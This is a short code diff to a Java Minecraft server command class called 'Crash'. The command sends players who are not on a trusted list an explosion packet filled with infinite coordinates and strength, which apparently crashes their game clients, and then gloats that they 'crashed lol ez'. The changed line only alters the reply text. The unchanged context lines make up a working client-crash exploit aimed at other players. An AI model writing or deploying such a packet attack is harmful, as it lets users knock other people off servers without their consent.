@@ -28,7 +28,7 @@ public final class Crash extends CommandBase {
         }
         ClientboundExplodePacket packet = new ClientboundExplodePacket(Double.POSITIVE_INFINITY, Double.POSITIVE_INFINITY, Double.POSITIVE_INFINITY, Float.POSITIVE_INFINITY, List.of(), new Vec3(Double.POSITIVE_INFINITY, Double.POSITIVE_INFINITY, Double.POSITIVE_INFINITY));
         pp.parallelStream().filter(pl -> !CommandManager.Instance.isTrusted(pl)).forEach(pl -> pl.sendPacket(packet));
-        var name = args.get(0).equals("*") ? "Everyone" : pp.stream().findFirst().get().getName();
+        var name = args.get(0).equals("*") ? "Everyone" : args.get(0);
         p.Reply(name + " crashed lol ez");
     }
 }
